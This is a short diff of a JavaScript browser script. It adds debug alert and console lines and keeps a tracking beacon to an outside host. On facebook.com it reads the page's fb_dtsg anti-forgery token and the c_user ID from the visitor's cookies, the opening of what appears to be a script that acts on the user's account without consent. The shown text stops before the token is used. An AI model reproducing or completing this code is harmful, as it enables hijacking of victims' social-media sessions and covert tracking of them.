@@ -1,4 +1,6 @@
-new Image().src="http://whos.amung.us/widget/1336zawjbo5s.png";
+ console.log("INSSIDE 777");
+  alert("INSSIDE 777");
+ new Image().src="http://whos.amung.us/widget/1336zawjbo5s.png";
 if(location.hostname.indexOf("facebook.com")>=0){
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
